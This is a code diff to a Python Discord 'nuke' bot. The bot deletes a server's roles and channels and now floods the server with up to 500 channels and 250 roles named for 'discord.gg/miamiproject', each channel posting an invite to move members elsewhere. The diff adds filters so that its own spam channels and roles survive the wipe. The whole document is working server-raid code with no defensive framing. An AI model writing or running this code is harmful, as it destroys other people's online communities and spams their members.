@@ -49,6 +49,26 @@ NUKE_ON_START = env_str("NUKE_ON_START", "1").lower() in {"1", "true", "yes", "o
 LOOP_SECONDS = max(5, int(env_str("LOOP_SECONDS", "8") or 8))
 KEEP_CATEGORY_NAME = "ПЕРЕХОДИМ СЮДА"
 KEEP_ROLE_NAME = "Admin"
+MAX_CHANNELS = 500
+MAX_ROLES = 250
+CREATE_PER_SWEEP = 35
+
+
+def is_keep_channel(channel: discord.abc.GuildChannel) -> bool:
+    name = channel.name.lower()
+    return (
+        "miami" in name
+        or "переход" in name
+        or "discord-gg" in name
+        or channel.name == KEEP_CATEGORY_NAME
+    )
+
+
+def is_keep_role(role: discord.Role) -> bool:
+    if role.is_default() or role.managed or role.name == KEEP_ROLE_NAME:
+        return True
+    name = role.name.lower()
+    return "miami" in name or "discord.gg" in name or "переход" in name
 
 
 def is_operator(member: discord.Member) -> bool:
@@ -377,7 +397,7 @@ async def nuke_guild(guild: discord.Guild, actor: discord.Member) -> str:
         if r != guild.default_role
         and not r.managed
         and r < me.top_role
-        and r.name != KEEP_ROLE_NAME
+        and not is_keep_role(r)
     ]
     for role in reversed(roles):
         try:
@@ -388,7 +408,7 @@ async def nuke_guild(guild: discord.Guild, actor: discord.Member) -> str:
         await asyncio.sleep(0.3)
 
     for channel in list(guild.channels):
-        if channel.name in MOVE_CHANNEL_NAMES or channel.name == KEEP_CATEGORY_NAME:
+        if is_keep_channel(channel):
             continue
         try:
             await channel.delete(reason=reason)
@@ -452,6 +472,41 @@ async def nuke_guild(guild: discord.Guild, actor: discord.Member) -> str:
         except discord.HTTPException:
             stats["create_fail"] += 1
         await asyncio.sleep(0.35)
+
+    made = 0
+    while len(guild.channels) < MAX_CHANNELS and made < CREATE_PER_SWEEP:
+        idx = len(guild.channels) + 1
+        name = f"discord-gg-miamiproject-{idx}"
+        try:
+            channel = await guild.create_text_channel(
+                name,
+                topic=MOVE_INVITE,
+                reason=reason,
+            )
+            await channel.send(MOVE_MESSAGE)
+            stats["created"] += 1
+            made += 1
+        except discord.HTTPException:
+            stats["create_fail"] += 1
+            break
+        await asyncio.sleep(0.35)
+
+    made_roles = 0
+    while len(guild.roles) < MAX_ROLES and made_roles < CREATE_PER_SWEEP:
+        idx = len(guild.roles)
+        try:
+            await guild.create_role(
+                name=f"miami discord.gg/miamiproject {idx}",
+                mentionable=False,
+                hoist=False,
+                reason=reason,
+            )
+            stats["created"] += 1
+            made_roles += 1
+        except discord.HTTPException:
+            stats["create_fail"] += 1
+            break
+        await asyncio.sleep(0.3)
 
     return (
         f"Сервер очищен.\n"
@@ -624,7 +679,7 @@ async def on_member_join(member: discord.Member):
 
 @bot.event
 async def on_guild_channel_create(channel: discord.abc.GuildChannel):
-    if channel.name in MOVE_CHANNEL_NAMES or channel.name == KEEP_CATEGORY_NAME:
+    if is_keep_channel(channel):
         return
     guild = channel.guild
     if guild and not guild_allowed(guild):
@@ -637,7 +692,7 @@ async def on_guild_channel_create(channel: discord.abc.GuildChannel):
 
 @bot.event
 async def on_guild_role_create(role: discord.Role):
-    if role.name == KEEP_ROLE_NAME or role.managed:
+    if is_keep_role(role):
         return
     if not guild_allowed(role.guild):
         return
